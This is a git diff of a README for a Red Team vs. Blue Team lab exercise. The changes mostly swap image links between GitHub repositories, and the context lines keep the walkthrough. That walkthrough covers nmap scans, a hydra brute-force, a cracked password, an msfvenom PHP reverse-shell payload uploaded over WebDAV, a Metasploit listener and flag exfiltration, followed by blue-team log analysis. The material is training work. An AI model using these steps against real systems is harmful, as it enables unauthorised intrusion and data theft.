@@ -9,10 +9,10 @@ a Red Team vs. Blue Team scenario in which you will play the role of both pentes
 ![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Diagram.png)
 ____________________________________________________________________________________________
 ### *Red Team Environment*
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Red%20Team.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Red%20Team.png)
 ____________________________________________________________________________________________
 ### *Blue Team Environment*
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Blue%20Team.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Blue%20Team.png)
 
 # **RED TEAM - Penetration Test**
 
@@ -25,9 +25,9 @@ To discover the target ip:
 netdiscover -r <ip subnet>
 ```
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture1.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture1.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture2.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture2.png)
 
 | IP | Machine |
 |:-------------:|:-------------:|
@@ -45,11 +45,11 @@ nmap -sV -v 192.168.1.105
 | Port 22 | SSH | OpenSSH 7.6p1 |
 | Port 80 | HTTP | Apache httpd 2.4.29 |
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture3.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture3.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture4.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture4.png)
 
-### **Aggressive scan:**
+### **Aggressive scan:*
 
 ```
 nmap -A -vvv 192.168.1.105
@@ -57,31 +57,31 @@ nmap -A -vvv 192.168.1.105
 
 A simple aggressive scan reveals a webserver directory structure on tcp port 80, which is a http port, and two potential usernames of employees – ashton and hannah (which will be more relevant for bruteforcing later):
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture5.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture5.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture6.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture6.png)
 
 ### **Navigating the Webserver:**
 
 As this is a webserver, we can investigate further from a browser in the attacker machine:
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture7.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture7.png)
 
 In a text document the blog directory we can see a 3rd potential username – Ryan, who would potentially have the highest level access as CEO:
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture8.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture8.png)
 
 In the _company folders_ directory, we can see reference to a &quot;_secret\_folder_&quot; in ALL documents within this directory, which is now a target for this Penetration Test.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture9.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture9.png)
 
 The _meet\_our\_team_ folder confirms the three potential users, and each document references the _secret\_folder:_
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture10.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture10.png)
 
 As we can see below, we will need Ashton&#39;s password to gain access to the secure hidden folder.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture11.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture11.png)
 
 ### **Vulnerability scan:**
 
@@ -97,13 +97,13 @@ Aggressive scan with a vulnerability script reveals:
 - SQL Injection vulnerability across all directories on the webserver
 - CVE-2017-15710 – Apache httpd vulnerability
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture12.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture12.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture13a.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture13a.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture14.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture14.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture15a.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture15a.png)
 
 ### **Bruteforce:**
 
@@ -115,7 +115,7 @@ Ashton, the CEO, had a common password within our password list. Using the follo
 hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
 ```
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture16.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture16.png)
 
 ### **SSH:**
 
@@ -125,39 +125,39 @@ ssh ashton@192.168.1.105
 
 Using Ashton's credentials we could gain ssh entry into the server.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture17.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture17.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture18.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture18.png)
 
 #### **Flag 1**
 
 In the root home directory we could pickup a flag.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture19.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture19.png)
 
 Using the same credentials, we could access the protected hidden folder.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture20.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture20.png)
 
 ### **Password hash:**
 
 Within this folder was a document with instructions to connect to a _corp\_server_. Included in the document are Ryan&#39;s hashed credentials and reference to a webdav directory
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture21.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture21.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture22.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture22.png)
 
 Th hashed md5 password was instantly cracked using Crackstation, revealing the password _linux4u_
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture23.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture23.png)
 
 ### **Webdav:**
 
 We could then login to webdav using Ryan&#39;s credentials.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture24.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture24.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture25.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture25.png)
 
 ### **Reverse Shell:**
 
@@ -171,7 +171,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o 
 
 Using msfvenom we created a payload – shell.php
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture26.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture26.png)
 
 #### **Cadaver**
 
@@ -181,9 +181,9 @@ cadaver http://192.168.1.105/webdav
 
 Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture27.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture27.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture28.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture28.png)
 
 #### **Metasploit**
 
@@ -194,11 +194,11 @@ use multi/handler
 
 Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture29.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture29.png)
 
 After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture30.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture30.png)
 
 ### **Gaining Interactive Shell:**
 
@@ -206,27 +206,27 @@ After loading the exploit and activating the shell.php we uploaded earlier by cl
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture31.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture31.png)
 
 ### **Finding Flag 2:**
 
 The next flag was located in the root directory.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture32.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture32.png)
 
 Exit back to meterpreter.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture33.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture33.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture34.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture34.png)
 
 ### **Exfiltration:**
 
 The file was easily exfiltrated back to the attacker machine.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture35.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture35.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture36.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture36.png)
 
 
 ## Vulnerabilities
@@ -354,35 +354,35 @@ This vulnerability relates to malicious filenames, in which the end of filenames
 
 **Filtering for Nmap:**
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture39.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture39.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture40.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture40.png)
 
 **Monitoring requests to the &quot;** _ **secret\_folder** _ **&quot;:**
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture41.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture41.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture42.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture42.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture43.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture43.png)
 
 **Filtering for the Hydra brute force attack:**
 
 There were 346,595 bruteforce attempts made with Hydra.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture44.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture44.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture45.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture45.png)
 
 **Finding the WebDAV connection:**
 
 A reverse shell in webdav was used 20 times.
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture46.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture46.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture47.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture47.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture48.png)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/Picture48.png)
 
 
 
@@ -393,12 +393,12 @@ A reverse shell in webdav was used 20 times.
 
 
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/blue1.PNG)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/blue1.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/blue2.PNG)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/blue2.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/blue3.PNG)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/blue3.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/blue4.PNG)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/blue4.png)
 
-![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/blue5.PNG)
+![alt-text](https://github.com/AlanShami/Red-Team-vs-Blue-Team-Project/blob/main/Pics/blue5.png)
